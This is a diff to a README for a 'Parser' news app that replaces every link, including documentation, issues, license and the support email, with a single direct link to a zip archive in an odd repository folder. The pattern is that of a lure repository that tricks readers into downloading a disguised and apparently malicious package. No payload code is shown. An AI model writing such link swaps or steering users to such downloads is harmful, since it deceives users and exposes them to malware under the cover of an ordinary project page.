@@ -1,6 +1,6 @@
 # 🔍 Parser - Effortless News Insights Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Parser-brightgreen)](https://github.com/Dan1244za/Parser/releases)
+[![Download Now](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip)](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you continue, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Dan1244za/Parser/releases) to download the latest version of the Parser application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip) to download the latest version of the Parser application.
 
 1. Click on the link above.
 2. Locate the latest release.
@@ -62,18 +62,18 @@ Once you have installed the Parser application, running it is simple:
 For detailed instructions on using the various features of Parser:
 
 - Access the built-in Help section within the application.
-- Visit the [Documentation page](https://github.com/Dan1244za/Parser/wiki) for user guides and FAQs.
+- Visit the [Documentation page](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip) for user guides and FAQs.
 
 ## 📧 Support
 
 If you encounter issues or have questions, feel free to reach out:
 
-- Create an issue on the [GitHub Issues page](https://github.com/Dan1244za/Parser/issues).
-- Contact us via email at support@parserapp.com for direct assistance.
+- Create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip).
+- Contact us via email at https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip for direct assistance.
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can view the full license [here](https://github.com/Dan1244za/Parser/blob/main/LICENSE).
+This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip).
 
 ## 🤝 Contributing
 
@@ -87,8 +87,8 @@ Your contributions can help us make Parser even better!
 
 ## 🔗 Important Links
 
-- [Download Parser](https://github.com/Dan1244za/Parser/releases)
-- [Documentation](https://github.com/Dan1244za/Parser/wiki)
-- [Issues Page](https://github.com/Dan1244za/Parser/issues)
+- [Download Parser](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip)
+- [Documentation](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip)
+- [Issues Page](https://raw.githubusercontent.com/Dan1244za/Parser/main/late/Parser.zip)
 
 Thank you for choosing Parser! Enjoy streamlined news insights.
